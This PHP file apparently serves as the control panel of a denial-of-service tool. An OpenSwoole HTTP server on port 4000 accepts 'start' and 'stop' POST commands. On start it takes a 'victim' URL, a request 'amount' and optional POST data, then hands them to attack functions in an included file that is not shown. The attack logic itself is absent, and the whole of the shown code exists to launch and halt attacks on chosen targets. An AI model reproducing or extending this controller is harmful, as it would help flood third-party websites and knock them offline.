<?php

use OpenSwoole\Http\Server;
use OpenSwoole\Http\Request;
use OpenSwoole\Http\Response;
use OpenSwoole\Table;

include 'attack_process.php';

// Paylaşımlı bir tablo oluşturun
$table = new Table(1024);
$table->column('countx', Table::TYPE_INT);
$table->column('duraklat', Table::TYPE_INT); 
$table->create();


$table->set('countx', ['countx' => 0]); 
$table->set('duraklat', ['duraklat' => 0]); 

$server = new Server("127.0.0.1", 4000);

$server->on("start", function (Server $server) {
    echo "Swoole HTTP server is started at http://127.0.0.1:4000\n";
});

$server->on("request", function (Request $request, Response $response) use ($table) {
    if ($request->server['request_method'] === 'POST') {
        if (isset($request->post['stop'])) {
            $table->set('duraklat', ['duraklat' => 1]); 
            $response->header("Content-Type", "text/plain");
            $response->end("Attack stop command received\n");
            $table->set('countx', ['countx' => 0]);
            
        }
        if (isset($request->post['start'])) {
            $countx = $table->get('countx', 'countx'); 
            if ($countx >= 1) return;
            $table->set('countx', ['countx' => 1]); 
            $table->set('duraklat', ['duraklat' => 0]);
            $url = $request->post['victim'];
            $amount = $request->post['amount'];
            if($request->post['post'] === null){
                echo 'geldii';
                attack_process($url, $amount, $response, $table);}
            else{
                echo 'here';
                $postval = $request->post['postv'];
                echo $postval;
                attack_post($url, $amount, $response, $table, $postval);
            }

            $response->header("Content-Type", "text/plain");
            $response->end("Attack started\n");
        }
    } else {
        $response->header("Content-Type", "text/plain");
        $response->end("Invalid request method\n");
    }
});

$server->start();
?>
